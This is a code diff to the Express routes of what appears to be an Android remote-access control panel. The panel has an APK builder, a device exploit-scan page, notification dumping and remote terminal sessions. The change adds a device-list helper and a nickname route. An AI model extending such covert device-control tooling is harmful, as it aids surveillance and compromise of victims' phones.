@@ -12,6 +12,30 @@ let app = global.app;
 let clientManager = global.clientManager;
 let apkBuilder = global.apkBuilder;
 
+// Helper: build client list for sidebar device selector
+function getClientListForViews() {
+    let all = clientManager.getClientList() || [];
+    return all.map(c => {
+        let dd = c.dynamicData || {};
+        let dev = dd.device || {};
+        return {
+            clientID: c.clientID,
+            nickname: c.nickname || '',
+            model: dev.model || 'Unknown',
+            manufacturer: dev.manufacture || dev.manufacturer || '',
+            isOnline: c.isOnline
+        };
+    });
+}
+
+// Helper: get display name for a device (nickname > model > Unknown)
+function getDeviceDisplayName(clientID) {
+    let all = getClientListForViews();
+    let c = all.find(x => x.clientID === clientID);
+    if (!c) return 'Unknown';
+    return c.nickname || c.model || 'Unknown';
+}
+
 app.use(cookieParser());
 app.use(bodyParser.json());
 app.use(bodyParser.urlencoded({ extended: true }));
@@ -35,7 +59,8 @@ routes.get('/dl', (req, res) => {
 routes.get('/', isAllowed, (req, res) => {
     res.render('index', {
         clientsOnline: clientManager.getClientListOnline(),
-        clientsOffline: clientManager.getClientListOffline()
+        clientsOffline: clientManager.getClientListOffline(),
+        allClients: getClientListForViews()
     });
 });
 
@@ -79,7 +104,8 @@ routes.get('/logout', isAllowed, (req, res) => {
 
 routes.get('/builder', isAllowed, (req, res) => {
     res.render('builder', {
-        myPort: CONST.control_port
+        myPort: CONST.control_port,
+        allClients: getClientListForViews()
     });
 });
 
@@ -130,7 +156,8 @@ routes.post('/builder', isAllowed, (req, res) => {
 
 routes.get('/logs', isAllowed, (req, res) => {
     res.render('logs', {
-        logs: logManager.getLogs()
+        logs: logManager.getLogs(),
+        allClients: getClientListForViews()
     });
 });
 
@@ -149,7 +176,8 @@ routes.get('/manage/:deviceid/exploits', isAllowed, (req, res) => {
         deviceID: req.params.deviceid,
         baseURL: '/manage/' + req.params.deviceid,
         pageData,
-        scanResults
+        scanResults,
+        allClients: getClientListForViews()
     });
 });
 
@@ -205,7 +233,8 @@ routes.get('/manage/:deviceid/:page', isAllowed, (req, res) => {
         page: page,
         deviceID: deviceID,
         baseURL: '/manage/' + deviceID,
-        pageData: pageData || {}
+        pageData: pageData || {},
+        allClients: getClientListForViews()
     });
 });
 
@@ -221,6 +250,17 @@ routes.post('/manage/:deviceid/delete', isAllowed, (req, res) => {
     }
     clientManager.deleteClient(deviceID);
     res.json({ error: false, message: 'Device deleted' });
+});
+
+// Set device nickname
+routes.post('/manage/:deviceid/nickname', isAllowed, (req, res) => {
+    let deviceID = req.params.deviceid;
+    let nickname = (req.body.nickname || '').trim();
+    if (!nickname) return res.json({ error: 'Nickname required' });
+    let client = db.maindb.get('clients').find({ clientID: deviceID });
+    if (!client.value()) return res.json({ error: 'Client not found' });
+    client.assign({ nickname: nickname }).write();
+    res.json({ error: false, message: 'Nickname set to: ' + nickname });
 });
 
 // Request the device to dump its currently active notifications
@@ -623,7 +663,8 @@ routes.get('/settings', isAllowed, (req, res) => {
         page: 'settings',
         deviceID: '',
         baseURL: '/settings',
-        pageData: settings
+        pageData: settings,
+        allClients: getClientListForViews()
     });
 });
 
@@ -650,8 +691,6 @@ routes.post('/manage/:deviceid/settings', isAllowed, (req, res) => {
         res.json({ error: false, message: section + ' settings saved' });
     } catch (e) { res.json({ error: 'Invalid settings JSON' }); }
 });
-
-module.exports = routes;
 
 // ============ LIVE TERMINAL SESSIONS ============
 const termSessions = {};
@@ -767,3 +806,5 @@ routes.post('/term/:deviceID/:type/reset', isAllowed, (req, res) => {
     let sess = getTermSession(req.params.deviceID, req.params.type);
     res.json({ error: false, cwd: sess.cwd });
 });
+
+module.exports = routes;
